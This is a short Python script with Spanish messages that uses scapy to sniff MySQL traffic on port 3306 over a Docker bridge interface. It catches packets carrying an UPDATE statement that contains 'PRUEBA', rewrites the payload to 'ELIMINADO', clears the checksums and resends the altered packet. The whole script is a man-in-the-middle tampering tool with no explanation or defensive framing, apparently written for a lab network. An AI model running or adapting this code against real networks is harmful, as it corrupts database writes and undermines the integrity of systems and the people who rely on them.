from scapy.all import sniff, IP, TCP, Raw, send

def interceptar(pkt):
    if pkt.haslayer(Raw):
        carga = pkt[Raw].load

        if b"UPDATE" in carga and b"PRUEBA" in carga:
            print("\n[!] Paquete capturado con UPDATE:")
            print(f"Original: {carga}")

            nueva_carga = carga.replace(b'PRUEBA', b'ELIMINADO')

            pkt_modificado = pkt.copy()
            pkt_modificado[Raw].load = nueva_carga

            del pkt_modificado[IP].len
            del pkt_modificado[IP].chksum
            del pkt_modificado[TCP].chksum

            send(pkt_modificado)
            print(f"[+] Modificado y enviado: {nueva_carga.decode(errors='ignore')}")

iface = "br-de64afa7851c"

print("[*] Escuchando en puerto 3306...")
sniff(iface=iface, filter="tcp port 3306", prn=interceptar, store=0)
